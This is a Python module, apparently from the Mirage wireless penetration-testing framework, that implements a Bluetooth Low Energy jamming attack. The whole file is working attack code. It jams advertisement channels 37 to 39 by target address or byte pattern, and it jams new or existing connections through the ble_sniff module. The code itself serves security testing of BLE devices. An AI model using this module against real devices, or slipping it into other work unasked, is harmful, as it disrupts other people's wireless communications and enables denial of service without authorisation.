from mirage.libs import io,ble,utils
from mirage.core import module

class ble_jam(module.WirelessModule):
	def init(self):

		self.technology = "ble"
		self.type = "attack"
		self.description = "Jamming module for Bluetooth Low Energy advertisements and connections"
		self.dependencies = ["ble_sniff"]
		self.args = {
				"INTERFACE":"microbit0",
				"INTERFACEA":"",
				"INTERFACEB":"",
				"JAMMING_MODE":"advertisements", 
				"TARGET":"", 
				"PATTERN":"",
				"OFFSET":"",
				"CHANNEL":"37",
				"ACCESS_ADDRESS":"",
				"CRC_INIT":"",
				"CHANNEL_MAP":""
			}

	def checkAdvertisementsJammingCapabilities(self):
		return all([receiver.hasCapabilities("JAMMING_ADVERTISEMENTS") for receiver in self.receivers])

	def initEmittersAndReceivers(self):
		self.emitters = []	
		self.receivers = []
		if self.args["INTERFACE"] != "" and self.args["INTERFACE"] != self.args["INTERFACEA"]:
			interface = self.args["INTERFACE"]
			self.emitters.append(self.getEmitter(interface=interface))
			self.receivers.append(self.getReceiver(interface=interface))
		if self.args["INTERFACEA"] != ""  and self.args["INTERFACEB"] != self.args["INTERFACEA"]:
			interfacea  = self.args["INTERFACEA"]
			self.emitters.append(self.getEmitter(interface=interfacea))
			self.receivers.append(self.getReceiver(interface=interfacea))
		if self.args["INTERFACEB"] != "" and self.args["INTERFACEB"] != self.args["INTERFACE"]:
			interfaceb  = self.args["INTERFACEB"]
			self.emitters.append(self.getEmitter(interface=interfaceb))
			self.receivers.append(self.getReceiver(interface=interfaceb))

	def jamAdvertisements(self):
		if self.checkAdvertisementsJammingCapabilities():
			channel = utils.integerArg(self.args["CHANNEL"])
			if self.args["TARGET"] != "":
				target = utils.addressArg(self.args["TARGET"])
				pattern = bytes.fromhex(target.replace(":",""))[::-1]
				offset = 2
			elif (	utils.isNumber(self.args["OFFSET"]) and
				utils.isHexadecimal(self.args["PATTERN"]) and
				self.args["OFFSET"] != "" and
				self.args["PATTERN"] != "" ):
				pattern = bytes.fromhex(self.args["PATTERN"])
				offset = utils.integerArg(self.args["OFFSET"])
			else:
				io.fail("You must provide a dewhitened pattern and an offset, or a target to jam.")
				return self.nok()

			if len(self.emitters) == 1:
				self.emitters[0].jamAdvertisements(pattern = pattern, offset = offset, channel = channel)
			if len(self.emitters) == 2:
				self.emitters[0].jamAdvertisements(pattern = pattern, offset = offset, channel = channel)
				self.emitters[1].jamAdvertisements(pattern = pattern, offset = offset, channel = 
												(channel+1 if channel < 39 else 37))
			if len(self.emitters) == 3:
				self.emitters[0].jamAdvertisements(pattern = pattern, offset = offset, channel = 37)
				self.emitters[1].jamAdvertisements(pattern = pattern, offset = offset, channel = 38)
				self.emitters[2].jamAdvertisements(pattern = pattern, offset = offset, channel = 39)

			while True:
				utils.wait(seconds=0.01)
			
		else:
			io.fail("Interfaces provided are not able to jam advertisements.")
			return self.nok()

	def jamNewConnections(self):
		jammingModule = utils.loadModule("ble_sniff")
		jammingModule["INTERFACE"] = self.args["INTERFACE"]
		jammingModule["INTERFACEA"] = self.args["INTERFACEA"]
		jammingModule["INTERFACEB"] = self.args["INTERFACEB"]
		jammingModule["CHANNEL"] = self.args["CHANNEL"]
		jammingModule["HIJACKING"] = "no"
		jammingModule["JAMMING"] = "yes"
		jammingModule["TARGET"] = self.args["TARGET"]
		jammingModule["SNIFFING_MODE"] = "newConnections"
		jammingModule["ACCESS_ADDRESS"] = ""
		jammingModule["CRC_INIT"] = ""
		jammingModule["CHANNEL_MAP"] = ""
		jammingModule["PCAP_FILE"] = ""
		output = jammingModule.execute()
		if output["success"]:
			return self.ok(output["output"])
		else:
			return self.nok()


	def jamExistingConnections(self):
		jammingModule = utils.loadModule("ble_sniff")
		jammingModule["INTERFACE"] = self.args["INTERFACE"]
		jammingModule["INTERFACEA"] = self.args["INTERFACEA"]
		jammingModule["INTERFACEB"] = self.args["INTERFACEB"]
		jammingModule["CHANNEL"] = self.args["CHANNEL"]
		jammingModule["HIJACKING"] = "no"
		jammingModule["JAMMING"] = "yes"
		jammingModule["TARGET"] = ""
		jammingModule["SNIFFING_MODE"] = "existingConnections"
		jammingModule["ACCESS_ADDRESS"] = self.args["ACCESS_ADDRESS"]
		jammingModule["CRC_INIT"] = self.args["CRC_INIT"]
		jammingModule["CHANNEL_MAP"] = self.args["CHANNEL_MAP"]
		jammingModule["PCAP_FILE"] = ""
		output = jammingModule.execute()
		if output["success"]:
			return self.ok(output["output"])
		else:
			return self.nok()

	def run(self):
		self.initEmittersAndReceivers()
		
		if self.args["JAMMING_MODE"].upper() == "advertisements".upper():
			return self.jamAdvertisements()
		elif self.args["JAMMING_MODE"].upper() == "newConnections".upper():
			return self.jamNewConnections()
		elif self.args["JAMMING_MODE"].upper() == "existingConnections".upper():
			return self.jamExistingConnections()

		return self.ok()

